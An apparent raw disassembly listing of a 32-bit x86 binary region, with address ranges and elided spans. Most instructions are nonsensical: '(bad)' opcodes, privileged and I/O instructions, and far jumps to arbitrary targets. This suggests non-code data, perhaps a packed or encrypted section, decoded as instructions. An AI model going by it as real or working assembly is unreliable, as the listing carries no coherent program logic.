  417160:	scas   eax,DWORD PTR es:[edi]
  417161:	adc    al,0x8d
  417163:	cmp    DWORD PTR [esi],0x156654b9
  417169:	xchg   BYTE PTR [ebx-0x4d],ch
  41716c:	lea    ecx,[ecx+0x49]
  41716f:	adc    DWORD PTR [esi-0xe],edx
  417172:	icebp  
  417173:	loope  0x4171c8
  417175:	repnz and dh,dh
  417178:	jmp    0x4171c0
  41717a:	int    0x11
  41717c:	ins    DWORD PTR es:[edi],dx
  41717d:	pop    esi
  41717e:	mov    al,ds:0x9dfeeff0
  417183:	inc    ecx
  417184:	cmp    DWORD PTR [edx+0x11],0x5961acd2
  41718b:	jmp    0x4898d967
  417190:	add    eax,0xa8a6d425
  417195:	iret   
  417196:	xchg   edx,eax
  417197:	and    DWORD PTR [ebx],esi
  417199:	pop    ebx
  41719a:	mov    ecx,DWORD PTR [esi-0x7b]
  41719d:	shr    BYTE PTR [edx],cl
  41719f:	or     cl,bh
  4171a1:	mov    esp,0xc6245e69
  4171a6:	and    BYTE PTR [eax-0x6b],ah
  4171a9:	sub    eax,0x476d0f2d
  4171ae:	sub    al,0xd0
  4171b0:	sbb    eax,0xa9312b23
  4171b5:	cwde   
  4171b6:	cmc    
  4171b7:	dec    ebp
  4171b8:	fdiv   DWORD PTR [esi+0x12]
  4171bb:	and    DWORD PTR [esi-0x390655f9],eax
	...
  417231:	add    BYTE PTR [eax],al
  417233:	add    BYTE PTR [ebx],ah
  417235:	outs   dx,BYTE PTR ds:[esi]
  417236:	xor    ah,BYTE PTR ds:0x6e377d7f
  41723c:	or     BYTE PTR [ebx-0x1b],dl
  41723f:	data16 sbb bh,dh
  417242:	sub    BYTE PTR [edi],0x84
  417245:	cld    
  417246:	add    BYTE PTR [eax],al
  417248:	cmc    
  417249:	add    BYTE PTR [eax],al
  41724b:	add    BYTE PTR [edx+edx*8],bl
  41724e:	pop    edx
  41724f:	cwde   
  417250:	inc    ecx
  417251:	pusha  
  417252:	mov    ah,0xf7
  417254:	fidiv  WORD PTR [esi]
  417256:	les    esi,FWORD PTR [ebx-0x1a]
  417259:	ret    
  41725a:	test   al,0xae
  41725c:	xchg   DWORD PTR [ebp+0x7aed742],esi
  417262:	cmp    dh,BYTE PTR [edi]
  417264:	fwait
  417265:	push   ecx
  417266:	and    al,0x18
  417268:	sbb    BYTE PTR [esi-0xb],dl
  41726b:	test   eax,0xe21bd91d
  417270:	inc    ebp
  417271:	mov    ah,bh
  417273:	jnp    0x417260
  417275:	mov    esi,0x4380f773
  41727a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41727b:	loope  0x41723b
  41727d:	inc    edi
  41727e:	xlat   BYTE PTR ds:[ebx]
  41727f:	xchg   DWORD PTR [edi-0x7e261a67],edi
  417285:	xchg   ebp,eax
  417286:	inc    ebp
  417287:	mov    ebp,0xa7c60728
  41728c:	test   BYTE PTR [edi-0x34],ch
  41728f:	mov    edx,0xe055713f
  417294:	fdivr  st,st(7)
  417296:	and    bh,BYTE PTR [edx+edx*4-0x1f815f98]
  41729d:	jecxz  0x4172c9
  41729f:	aaa    
  4172a0:	cld    
  4172a1:	stos   BYTE PTR es:[edi],al
  4172a2:	hlt    
  4172a3:	mov    cl,0xe
  4172a5:	stos   DWORD PTR es:[edi],eax
  4172a6:	pop    eax
  4172a7:	mov    bh,0x5a
  4172a9:	xchg   esp,eax
  4172aa:	xchg   esp,eax
  4172ab:	ficom  DWORD PTR [ecx+0x3d1a2e66]
  4172b1:	retf   0x68a1
  4172b4:	jmp    0x4172c0
  4172b6:	lods   eax,DWORD PTR ds:[esi]
  4172b7:	or     eax,0x75573b7d
  4172bc:	sub    edx,DWORD PTR [esp+eiz*4+0x5ca3419a]
  4172c3:	push   cs
  4172c4:	sbb    eax,0xc982ddca
  4172c9:	add    bl,BYTE PTR [eax+0x64567e59]
  4172cf:	and    DWORD PTR [ebx-0x71752ea4],0x810199d4
  4172d9:	cmp    edi,esi
  4172db:	adc    eax,0x6c8228eb
  4172e0:	in     al,0xad
  4172e2:	jmp    0x72a1:0xe90d3925
  4172e9:	dec    esp
  4172ea:	jle    0x417295
  4172ec:	pop    ss
  4172ed:	lods   al,BYTE PTR ds:[esi]
  4172ee:	repnz inc esp
  4172f0:	(bad)  
  4172f1:	and    al,BYTE PTR [esi+0x18]
  4172f4:	fld    QWORD PTR ss:[ebp-0x3eb8f8f5]
  4172fb:	and    DWORD PTR [ebx-0x1b26f45a],edi
  417301:	xchg   esi,eax
  417302:	sahf   
  417303:	cmp    DWORD PTR [ebx],0x62e3ce75
  417309:	mov    ebx,0x12f9fccb
  41730e:	ret    0x50ac
  417311:	ds popa 
  417313:	push   ds
  417314:	cmp    BYTE PTR [edx-0x39],bl
  417317:	inc    esi
  417318:	repz dec ebp
  41731a:	test   eax,0x5039fa6c
  41731f:	dec    eax
  417320:	jb     0x417389
  417322:	dec    esi
  417323:	popa   
  417324:	arpl   WORD PTR ds:0x5f6fc567,dx
  41732a:	cmp    edi,ebx
  41732c:	mov    ecx,0xa417f2e2
  417331:	pushw  ss
  417333:	dec    esi
  417334:	xor    esp,DWORD PTR [eax+0x1d]
  417337:	xchg   ecx,eax
  417338:	jno    0x417395
  41733a:	inc    esp
  41733b:	mov    eax,DWORD PTR [eax]
  41733d:	loop   0x417356
  41733f:	cmp    bl,bl
	...
  4173b1:	add    BYTE PTR [eax],al
  4173b3:	add    bl,dh
  4173b5:	inc    ebx
  4173b6:	ror    cl,1
  4173b8:	lock (bad) 
  4173bb:	jnp    0x4173cb
  4173bd:	jmp    0x41733f
  4173bf:	sbb    al,0x7
  4173c1:	clc    
  4173c2:	test   DWORD PTR [edx],esi
  4173c4:	jns    0x4173c3
  4173c6:	add    BYTE PTR [eax],al
  4173c8:	cmc    
  4173c9:	add    BYTE PTR [eax],al
  4173cb:	add    BYTE PTR [ebx+0x68],ah
  4173ce:	das    
  4173cf:	hlt    
  4173d0:	push   ds
  4173d1:	add    edx,DWORD PTR [esi]
  4173d3:	add    DWORD PTR [esi-0x2],eax
  4173d6:	jl     0x417433
  4173d8:	inc    esi
  4173d9:	int    0x2c
  4173db:	mov    eax,ds:0xe4ed358c
  4173e0:	cld    
  4173e1:	das    
  4173e2:	retf   0xbf60
  4173e5:	mov    DWORD PTR [edi+0x7b17860b],ebx
  4173eb:	add    edx,ebx
  4173ed:	lock mov al,BYTE PTR [esi-0x666ba12]
  4173f4:	pop    ds
  4173f5:	dec    esi
  4173f6:	cmp    ecx,DWORD PTR [edi+0xf]
  4173f9:	aad    0x2e
  4173fb:	ins    BYTE PTR es:[edi],dx
  4173fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173fd:	and    eax,0xff73a22a
  417402:	mov    edi,0x2a326d4a
  417407:	cmovb  esi,ebp
  41740a:	xchg   edi,eax
  41740b:	xchg   edi,eax
  41740c:	jl     0x41745f
  41740e:	inc    ebx
  41740f:	(bad)  
  417410:	int3   
  417411:	inc    ebx
  417412:	adc    BYTE PTR ds:0xc9942032,0xd3
  417419:	xor    ecx,ebx
  41741b:	xchg   edi,eax
  41741c:	cmc    
  41741d:	push   ss
  41741e:	sub    BYTE PTR [edi+ebp*4],ch
  417421:	xchg   edx,eax
  417422:	into   
  417423:	mov    esi,0x9cca8ab7
  417428:	fstp   QWORD PTR [ebp+0x5f]
  41742b:	stos   DWORD PTR es:[edi],eax
  41742c:	scas   al,BYTE PTR es:[edi]
  41742d:	fisubr DWORD PTR [ebx+0x60]
  417430:	dec    ebx
  417431:	xchg   esp,eax
  417432:	cld    
  417433:	jb     0x41745e
  417435:	or     al,0x68
  417437:	das    
  417438:	clc    
  417439:	mov    ds:0x3d05c518,eax
  41743e:	das    
  41743f:	aam    0x11
  417441:	mov    eax,0xe853d49d
  417446:	lea    edx,[ebx+0xeaf4218]
  41744c:	stos   BYTE PTR es:[edi],al
  41744d:	pop    ds
  41744e:	scas   al,BYTE PTR es:[edi]
  41744f:	mov    edi,0xa56d0fe9
  417454:	dec    esp
  417455:	out    dx,eax
  417456:	loopne 0x417427
  417458:	xchg   edi,eax
  417459:	mov    dh,BYTE PTR [esi+0x65]
  41745c:	ror    DWORD PTR [ebx-0x26],0x3e
  417460:	pusha  
  417461:	test   BYTE PTR [ebp-0x27],0x2c
  417465:	imul   eax,DWORD PTR [esp+edx*4+0x18116f1],0xae5dfd74
  417470:	pop    esi
  417471:	aad    0x0
  417473:	inc    edi
  417474:	jmp    0xce82:0x9f0d56d7
  41747b:	ins    DWORD PTR es:[edi],dx
  41747c:	cmp    eax,0x312f27f3
  417481:	inc    edi
  417482:	cdq    
  417483:	enter  0x5c03,0x85
  417487:	data16 (bad) 
  417489:	cli    
  41748a:	mov    ecx,0xfa4faf89
  41748f:	sub    eax,0x5b5b6301
  417494:	add    ch,cl
  417496:	lea    ebp,[edx+0x63727ba]
  41749c:	xor    esp,ebp
  41749e:	jp     0x4174d2
  4174a0:	add    al,0xb2
  4174a2:	xchg   esp,eax
  4174a3:	push   esi
  4174a4:	pop    edi
  4174a5:	retf   
  4174a6:	repz jbe 0x4174e4
  4174a9:	and    BYTE PTR [esi+0x56b94d89],dh
  4174af:	iret   
  4174b0:	loop   0x417445
  4174b2:	pushf  
  4174b3:	repz mov edx,ebp
  4174b6:	adc    DWORD PTR [esi-0x220fde21],ebx
  4174bc:	and    BYTE PTR [esi+0x1f],al
  4174bf:	jbe    0x4174d9
	...
  417531:	add    BYTE PTR [eax],al
  417533:	add    BYTE PTR ds:0xfff32bd8,ah
  417539:	repz std 
  41753b:	fimul  WORD PTR [edx]
  41753d:	mov    edi,0x17233b7a
  417542:	mov    esi,0xfe6e32
  417547:	add    ch,dh
  417549:	add    BYTE PTR [eax],al
  41754b:	add    BYTE PTR [ecx-0x74],bh
  41754e:	ss jg  0x417577
  417551:	sti    
  417552:	stc    
  417553:	lgdtd  [eax+eiz*1-0x5eecc529]
  41755b:	jmp    0x5767:0x1100f7f9
  417562:	ins    BYTE PTR es:[edi],dx
  417563:	in     eax,0xc9
  417565:	cld    
  417566:	repnz push 0x17
  417569:	adc    BYTE PTR [ecx],ch
  41756b:	shr    DWORD PTR [edx],1
  41756d:	nop
  41756e:	icebp  
  41756f:	stc    
  417570:	dec    ebp
  417571:	cli    
  417572:	nop
  417573:	push   ecx
  417574:	cmp    DWORD PTR [edx+edi*2-0xee9cfdb],edi
  41757b:	mov    cl,0xa5
  41757d:	xchg   ebp,eax
  41757e:	call   0x469:0x51bff9a6
  417585:	jl     0x417545
  417587:	cmp    edx,DWORD PTR [ebp-0xd]
  41758a:	retf   
  41758b:	ds push 0x72
  41758e:	xor    BYTE PTR [edx-0x3b472769],dl
  417594:	repz in al,dx
  417596:	or     DWORD PTR [edx+0x1f],esi
  417599:	or     al,0x30
  41759b:	mov    edx,0x53f68ab6
  4175a0:	outs   dx,BYTE PTR ds:[esi]
  4175a1:	enter  0x9acd,0x39
  4175a5:	dec    ecx
  4175a6:	iret   
  4175a7:	xchg   ecx,eax
  4175a8:	(bad)  
  4175a9:	xor    eax,0x4f2ec68e
  4175ae:	dec    esp
  4175af:	rcr    BYTE PTR [eax+ecx*1+0x5],cl
  4175b3:	jg     0x4175d7
  4175b5:	xor    ch,ch
  4175b7:	cmp    DWORD PTR [edx-0x473e671c],ebp
  4175bd:	mov    edi,0xd5c5473
  4175c2:	rcr    BYTE PTR [edx-0x7a420ff6],0xa9
  4175c9:	mov    ebx,0xf9b0a743
  4175ce:	out    dx,al
  4175cf:	xor    bh,BYTE PTR [edx-0x25]
  4175d2:	loope  0x4175bd
  4175d4:	mov    bl,0x5b
  4175d6:	or     DWORD PTR [ecx+0x26],edi
  4175d9:	rol    DWORD PTR [edx],cl
  4175db:	ror    WORD PTR [ecx+ebx*1],1
  4175df:	inc    edi
  4175e0:	sahf   
  4175e1:	adc    esi,0xd
  4175e4:	pop    es
  4175e5:	fimul  DWORD PTR [ebp+eiz*4-0x18]
  4175e9:	retf   
  4175ea:	in     eax,0x2a
  4175ec:	inc    eax
  4175ed:	pop    ds
  4175ee:	stc    
  4175ef:	xor    eax,0xd1b7a86d
  4175f4:	(bad)  
  4175f5:	jl     0x417588
  4175f7:	imul   esi,edx,0x2b1edc2b
  4175fd:	push   esi
  4175fe:	in     al,dx
  4175ff:	stos   BYTE PTR es:[edi],al
  417600:	dec    DWORD PTR [edi+0x1c]
  417603:	mov    BYTE PTR [eax-0x5b],dl
  417606:	(bad)  
  417607:	xor    esi,edi
  417609:	popf   
  41760a:	xchg   ecx,eax
  41760b:	cmp    ah,BYTE PTR [edi+0x40]
  41760e:	ins    BYTE PTR es:[edi],dx
  41760f:	inc    ebp
  417610:	out    dx,eax
  417611:	sub    dl,BYTE PTR [edi+0x1ea86b81]
  417617:	cmp    DWORD PTR [ecx],ecx
  417619:	add    BYTE PTR [ebx],bh
  41761b:	jmp    0x2eeecef0
  417620:	mov    edx,0x1daaf49
  417625:	lods   al,BYTE PTR ds:[esi]
  417626:	xchg   esi,eax
  417627:	lds    esi,FWORD PTR [esi-0xb]
  41762a:	mov    ah,0x99
  41762c:	cmp    esp,DWORD PTR [ebp-0x319f7a72]
  417632:	rcl    ebx,1
  417634:	fcmovbe st,st(5)
  417636:	jns    0x4175d0
  417638:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417639:	mov    ah,0xd5
  41763b:	(bad)  
  41763c:	imul   DWORD PTR [ebp+esi*4+0x8ecc]
	...
  4176b3:	add    ah,al
  4176b5:	(bad)  
  4176b7:	(bad)  
  4176b8:	(bad)  
  4176ba:	out    0xff,eax
  4176bc:	xchg   BYTE PTR [eax],dh
  4176be:	jns    0x4176dd
  4176c0:	fist   WORD PTR [edi-0x9c3d97]
  4176c6:	add    BYTE PTR [eax],al
  4176c8:	cmc    
  4176c9:	add    BYTE PTR [eax],al
  4176cb:	add    BYTE PTR [eax+0xd],al
  4176ce:	(bad)  
  4176cf:	ja     0x417705
  4176d1:	call   FWORD PTR [edi]
  4176d3:	(bad)  [ebp-0x3e]
  4176d6:	jns    0x417731
  4176d8:	test   DWORD PTR [edx-0x1048760b],0xe1629ff8
  4176e2:	xchg   BYTE PTR [edi],cl
  4176e4:	add    eax,DWORD PTR [ecx-0x6b63ff3b]
  4176ea:	(bad)  
  4176ec:	xchg   esp,eax
  4176ed:	push   ebp
  4176ee:	cdq    
  4176ef:	and    esp,DWORD PTR [edx-0x7d]
  4176f2:	dec    ebp
  4176f3:	ins    BYTE PTR es:[edi],dx
  4176f4:	fistp  DWORD PTR [edi-0x7d]
  4176f7:	pop    ebx
  4176f8:	shl    cl,cl
  4176fa:	lods   eax,DWORD PTR ds:[esi]
  4176fb:	das    
  4176fc:	jp     0x417746
  4176fe:	and    ecx,0x876c79f6
  417704:	leave  
  417705:	sbb    ecx,ebp
  417707:	cli    
  417708:	xor    al,0x6
  41770a:	mov    ch,cl
  41770c:	sub    BYTE PTR gs:[edi-0x55],0xba
  417711:	(bad)  
  417712:	in     al,0x4c
  417714:	in     eax,dx
  417715:	pop    eax
  417716:	push   0xffffffd5
  417718:	in     eax,0x25
  41771a:	dec    ebx
  41771b:	xchg   ebp,eax
  41771c:	and    al,BYTE PTR [esi]
  41771e:	aaa    
  41771f:	dec    ebx
  417720:	leave  
  417721:	in     eax,dx
  417722:	inc    ecx
  417723:	clc    
  417724:	push   eax
  417725:	push   edx
  417726:	xchg   DWORD PTR [ebx-0x41ccc163],esp
  41772c:	gs sub eax,esp
  41772f:	push   ecx
  417730:	cmp    DWORD PTR [eax-0x7a],edx
  417733:	ja     0x41775f
  417735:	jae    0x4177a7
  417737:	and    DWORD PTR [eax-0x3339cdd],eax
  41773d:	bound  esp,QWORD PTR [ebp+0x17]
  417740:	enter  0xad20,0x2a
  417744:	push   0xffffffb4
  417746:	xor    DWORD PTR [eax],ebx
  417748:	jno    0x41777e
  41774a:	shl    esi,1
  41774c:	fistp  DWORD PTR [ebx+0x12]
  41774f:	dec    edx
  417750:	adc    al,0xe4
  417752:	mov    ecx,0x41b0efc1
  417757:	dec    edi
  417758:	je     0x4176fa
  41775a:	xchg   edx,eax
  41775b:	cdq    
  41775c:	adc    eax,0x33b82ac5
  417761:	jecxz  0x417782
  417763:	xchg   edx,eax
  417764:	push   eax
  417765:	inc    ebp
  417766:	js     0xe3962bae
  41776c:	fwait
  41776d:	stos   BYTE PTR es:[edi],al
  41776e:	sbb    dl,BYTE PTR [edi+ecx*4-0x3a976315]
  417775:	aas    
  417776:	mov    dl,0x3
  417778:	shl    DWORD PTR [ebx+eiz*2],0x86
  41777c:	sub    eax,0xfbb8106c
  417781:	adc    cl,ah
  417783:	adc    DWORD PTR [ecx],ebp
  417785:	and    dl,BYTE PTR [ebx]
  417787:	cmp    DWORD PTR [ebx+0x1f57367e],ebx
  41778d:	cmp    esi,ecx
  41778f:	fwait
  417790:	shl    DWORD PTR [edx-0x27],1
  417793:	push   edi
  417794:	and    BYTE PTR [ebx+0x283d6049],0x43
  41779b:	or     ecx,eax
  41779d:	(bad)  
  41779e:	inc    DWORD PTR [edx-0x6d811a1e]
  4177a4:	imul   ebx,DWORD PTR [ecx+0x7d],0x4f
  4177a8:	push   es
  4177a9:	xlat   BYTE PTR ds:[ebx]
  4177aa:	inc    edx
  4177ab:	into   
  4177ac:	push   ds
  4177ad:	icebp  
  4177ae:	cwde   
  4177af:	lds    ebp,FWORD PTR [ecx-0x5c]
  4177b2:	or     eax,0x241767ef
  4177b7:	ins    DWORD PTR es:[edi],dx
  4177b8:	inc    esi
  4177b9:	and    eax,0x70538809
  4177be:	xchg   DWORD PTR [ecx],edi
  4177c0:	mov    BYTE PTR [eax],0x0
	...
  417833:	add    cl,dl
  417835:	scas   eax,DWORD PTR es:[edi]
  417836:	push   es
  417837:	repz jle 0x417835
  41783a:	cmc    
  41783b:	scas   eax,DWORD PTR es:[edi]
  41783c:	mov    ebx,0x6c7d6e99
  417841:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417842:	loope  0x4178b3
  417844:	pop    eax
  417845:	add    BYTE PTR [ecx],al
  417847:	add    ch,dh
  417849:	add    BYTE PTR [eax],al
  41784b:	add    BYTE PTR [edi+esi*4],dh
  41784e:	adc    BYTE PTR [edi],0x46
  417851:	add    al,0x18
  417853:	push   0xffffff98
  417855:	push   ss
  417856:	mov    BYTE PTR [edi+0x1c],ch
  417859:	je     0x41783e
  41785b:	inc    ebp
  41785c:	int    0xb4
  41785e:	adc    ebx,ecx
  417860:	lods   eax,DWORD PTR ds:[esi]
  417861:	sub    BYTE PTR [eax+eiz*1-0x23],dl
  417865:	xor    DWORD PTR [eax],ebp
  417867:	scas   eax,DWORD PTR es:[edi]
  417868:	loope  0x417851
  41786a:	mov    ecx,eax
  41786c:	jnp    0x4178c2
  41786e:	loop   0x41789c
  417870:	jnp    0x4178c6
  417872:	in     al,dx
  417873:	sub    eax,0x39677724
  417878:	mov    cl,0xd8
  41787a:	sbb    ebx,DWORD PTR [edx]
  41787c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41787d:	mov    DWORD PTR [edi-0x3d80e171],esp
  417883:	out    0x2c,eax
  417885:	test   DWORD PTR [ecx-0x61],edx
  417888:	jmp    FWORD PTR [edx+ebp*8-0x23]
  41788c:	xchg   esp,eax
  41788d:	clc    
  41788e:	in     al,dx
  41788f:	cmc    
  417890:	test   al,0x3d
  417892:	or     DWORD PTR [eax],esi
  417894:	or     BYTE PTR [edx+0x2ab088ec],dl
  41789a:	js     0x4178ef
  41789c:	(bad)  
  41789d:	pushf  
  41789e:	xchg   ecx,eax
  41789f:	pop    es
  4178a0:	dec    eax
  4178a1:	stc    
  4178a2:	jp     0x4178d7
  4178a4:	clc    
  4178a5:	sbb    ch,BYTE PTR [edx-0x54ca1877]
  4178ab:	fdiv   st(4),st
  4178ad:	mov    bh,0x97
  4178af:	fdivr  DWORD PTR [edx-0x70f00806]
  4178b5:	inc    esi
  4178b6:	pushf  
  4178b7:	xor    ah,ch
  4178b9:	stos   BYTE PTR es:[edi],al
  4178ba:	dec    esp
  4178bb:	stc    
  4178bc:	loop   0x417915
  4178be:	out    0x9c,al
  4178c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178c2:	sub    DWORD PTR [edx],eax
  4178c4:	jb     0xb2334b72
  4178ca:	(bad)  
  4178cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178cc:	into   
  4178cd:	dec    ebp
  4178ce:	cmp    esi,DWORD PTR [esi+0x5fcc5e97]
  4178d4:	jp     0x417880
  4178d6:	xor    edx,DWORD PTR [eax-0x3249c12b]
  4178dc:	lea    esp,[ebx]
  4178de:	shr    BYTE PTR [esi],1
  4178e0:	pop    es
  4178e1:	in     al,dx
  4178e2:	jmp    0x1fe8:0x685d2ce5
  4178e9:	or     DWORD PTR [esi],ebp
  4178eb:	repz add eax,0x29fbcaff
  4178f1:	les    esi,FWORD PTR [eax+0x7]
  4178f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178f5:	jmp    0xada4:0x3894d478
  4178fc:	push   0x66
  4178fe:	inc    esi
  4178ff:	or     eax,0x55b81254
  417904:	repnz stos DWORD PTR es:[edi],eax
  417906:	xchg   BYTE PTR [ecx+0x2492fcdb],al
  41790c:	jge    0x4178af
  41790e:	inc    ebp
  41790f:	add    dh,BYTE PTR [ebx]
  417911:	add    al,0xcb
  417913:	pop    esi
  417914:	xchg   edx,eax
  417915:	bnd jge 0x417927
  417918:	push   ecx
  417919:	popa   
  41791a:	test   DWORD PTR [edi],edx
  41791c:	pop    ebp
  41791d:	cli    
  41791e:	inc    esi
  41791f:	xchg   ebp,eax
  417920:	stc    
  417921:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417922:	test   ebx,0xb4d9e49e
  417928:	pop    ecx
  417929:	xor    eax,0xd6d3c285
  41792e:	inc    ebp
  41792f:	add    BYTE PTR ds:0xf41cbd88,al
  417935:	or     esp,ebx
  417937:	adc    al,0xe7
  417939:	mov    WORD PTR [eax+0x336da80],fs
  41793f:	xor    al,0x2c
	...
  4179b1:	add    BYTE PTR [eax],al
  4179b3:	add    bl,cl
  4179b5:	pusha  
  4179b6:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  4179bc:	lea    esi,[esi+0x6c26c980]
  4179c2:	cmp    DWORD PTR [eax+0x1014d],esi
  4179c8:	cmc    
  4179c9:	add    BYTE PTR [eax],al
  4179cb:	add    BYTE PTR [edx-0x3fadb134],ch
  4179d1:	scas   al,BYTE PTR es:[edi]
  4179d2:	out    dx,eax
  4179d3:	jmp    0x417979
  4179d5:	ror    DWORD PTR [ecx-0x26],1
  4179d8:	add    ebp,eax
  4179da:	das    
  4179db:	in     al,dx
  4179dc:	mov    al,0xa
  4179de:	sub    al,0x66
  4179e0:	mov    esp,0x4b2912e4
  4179e5:	adc    bl,BYTE PTR [ebx]
  4179e7:	mov    cs,WORD PTR [esi]
  4179e9:	mov    eax,ds:0xc8700df4
  4179ee:	sub    eax,0xec4aa95c
  4179f3:	addr16 dec ebp
  4179f5:	push   esp
  4179f6:	sub    DWORD PTR [edi],edx
  4179f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179f9:	fld    QWORD PTR [esi]
  4179fb:	out    dx,eax
  4179fc:	fstp   DWORD PTR [ecx]
  4179fe:	and    ebp,DWORD PTR [eax]
  417a00:	lods   eax,DWORD PTR ds:[esi]
  417a01:	leave  
  417a02:	stos   DWORD PTR es:[edi],eax
  417a03:	jl     0x417a52
  417a05:	push   ss
  417a06:	mov    ds:0x221dd627,al
  417a0b:	scas   eax,DWORD PTR es:[edi]
  417a0c:	cs aam 0x8f
  417a0f:	rcl    DWORD PTR [edx-0x38ff5892],0x59
  417a16:	daa    
  417a17:	test   dh,dl
  417a19:	xlat   BYTE PTR ds:[ebx]
  417a1a:	cmp    ebx,edi
  417a1c:	(bad)  
  417a1d:	repnz loopne 0x4179ce
  417a20:	enter  0x51b8,0x51
  417a24:	and    ax,0x714f
  417a28:	and    BYTE PTR [edi-0x18],0xaa
  417a2c:	cmp    dl,BYTE PTR [eax]
  417a2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a2f:	cwde   
  417a30:	sar    esi,0x31
  417a33:	(bad)  
  417a34:	(bad)  
  417a35:	adc    dh,dl
  417a37:	aam    0xa4
  417a39:	pushf  
  417a3a:	mov    ds:0x8ec383f9,al
  417a3f:	shl    bl,0x4c
  417a42:	jmp    0x7c851f1e
  417a47:	test   eax,0xe5355bcf
  417a4c:	fabs   
  417a4e:	jmp    0x26fd:0x78991b10
  417a55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a56:	pop    es
  417a57:	jbe    0x417a7f
  417a59:	mov    al,ds:0xa6737642
  417a5e:	xchg   esi,eax
  417a5f:	push   edi
  417a60:	or     ecx,DWORD PTR [ecx+0x1e67e541]
  417a66:	out    dx,eax
  417a67:	xchg   BYTE PTR [ebx],dh
  417a69:	idiv   DWORD PTR [ebx+0x7d8fe18c]
  417a6f:	(bad)  
  417a70:	cmp    ah,BYTE PTR [edx+0x7f]
  417a73:	imul   eax,DWORD PTR [eax+0x2b573a33],0xffffffeb
  417a7a:	xlat   BYTE PTR ds:[ebx]
  417a7b:	lods   al,BYTE PTR ds:[esi]
  417a7c:	pop    edx
  417a7d:	inc    esi
  417a7e:	sub    BYTE PTR [edi-0x10],dh
  417a81:	add    eax,0x1ef5f1ba
  417a86:	jg     0x417aac
  417a88:	sub    eax,0xf2166fb9
  417a8d:	(bad)  
  417a8e:	cmc    
  417a8f:	cmp    eax,0x99ff6567
  417a94:	mov    bl,0xf6
  417a96:	inc    esp
  417a97:	xchg   edi,eax
  417a98:	pop    esi
  417a99:	fnop   
  417a9b:	rol    DWORD PTR [ecx+ebx*2],0x70
  417a9f:	jg     0x417afb
  417aa1:	push   0xffffffa5
  417aa3:	push   esi
  417aa4:	in     al,dx
  417aa5:	ret    0x5bc7
  417aa8:	outs   dx,DWORD PTR ds:[esi]
  417aa9:	rol    dl,0xc4
  417aac:	mov    cl,0xde
  417aae:	mov    ah,0x53
  417ab0:	push   edx
  417ab1:	push   edx
  417ab2:	pop    eax
  417ab3:	mov    al,0x60
  417ab5:	imul   eax,ebx,0x52
  417ab8:	adc    eax,0x1d75586c
  417abd:	mov    gs,WORD PTR [esi+eiz*1]
  417ac0:	test   eax,0x0
	...
  417b31:	add    BYTE PTR [eax],al
  417b33:	add    bl,ah
  417b35:	gs push cs
  417b37:	test   DWORD PTR [esi+0x6a75fbff],0x12fef5f7
  417b41:	adc    eax,0x2420388
  417b46:	add    DWORD PTR [eax],eax
  417b48:	cmc    
  417b49:	add    BYTE PTR [eax],al
  417b4b:	add    BYTE PTR [ebx],dl
  417b4d:	(bad)  
  417b4e:	fcmovu st,st(5)
  417b50:	add    DWORD PTR [esi-0x188fb941],ebp
  417b56:	cdq    
  417b57:	xchg   ebp,eax
  417b58:	not    BYTE PTR ds:0xb6f12e5c
  417b5e:	iret   
  417b5f:	arpl   bx,bp
  417b61:	clc    
  417b62:	push   ecx
  417b63:	mov    DWORD PTR [ecx+0x238a6e13],edx
  417b69:	test   ebx,0xd030e953
  417b6f:	jmp    0x50ea7c72
  417b74:	push   esp
  417b75:	cmp    dh,BYTE PTR [eax+0x71]
  417b78:	xor    bh,BYTE PTR [edx+0x31]
  417b7b:	js     0x417b94
  417b7d:	ret    0x176
  417b80:	js     0x417bda
  417b82:	mov    ds:0xe026ad88,al
  417b87:	jmp    0xc5d7:0xbc8dd06b
  417b8e:	jmp    0x417b72
  417b90:	pop    eax
  417b91:	call   0x8b4f:0xcb1bf0cb
  417b98:	xchg   esi,eax
  417b99:	stos   BYTE PTR es:[edi],al
  417b9a:	adc    DWORD PTR [edx-0x53],0x1f3ec956
  417ba1:	xor    al,0xcf
  417ba3:	loopne 0x417b73
  417ba5:	nop
  417ba6:	scas   al,BYTE PTR es:[edi]
  417ba7:	push   cs
  417ba8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ba9:	(bad)  
  417baa:	mov    cl,0xeb
  417bac:	pop    edi
  417bad:	not    DWORD PTR [esi-0x3f]
  417bb0:	push   ebp
  417bb1:	jb     0x417c22
  417bb3:	mov    dh,0xee
  417bb5:	mov    ebp,0xbb00d315
  417bba:	lock fs js 0x417b88
  417bbe:	or     esp,DWORD PTR [esi+ebx*8]
  417bc1:	xchg   edx,eax
  417bc2:	bound  edi,QWORD PTR [ebp-0x2dca2746]
  417bc8:	mov    ecx,0xdc7f3619
  417bcd:	mov    ebx,esp
  417bcf:	push   ds
  417bd0:	mov    BYTE PTR [esi+ebp*4+0x20],0x92
  417bd5:	jb     0x417bf0
  417bd7:	add    DWORD PTR [esi],ebp
  417bd9:	add    BYTE PTR [edi+0x1f],bl
  417bdc:	jecxz  0x417bdd
  417bde:	es test eax,0x5ee83638
  417be4:	aas    
  417be5:	adc    al,0xf1
  417be7:	pop    edi
  417be8:	xor    BYTE PTR [ecx],0xd7
  417beb:	neg    DWORD PTR [ecx]
  417bed:	rcl    BYTE PTR [edi-0x2],cl
  417bf0:	lods   eax,DWORD PTR fs:[esi]
  417bf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bf3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bf4:	pop    edi
  417bf5:	clc    
  417bf6:	jns    0x417c20
  417bf8:	test   BYTE PTR [ecx-0xc],cl
  417bfb:	sahf   
  417bfc:	adc    al,0xb2
  417bfe:	popf   
  417bff:	mov    bl,BYTE PTR [edi+0x34]
  417c02:	or     BYTE PTR [esi+0x17],dh
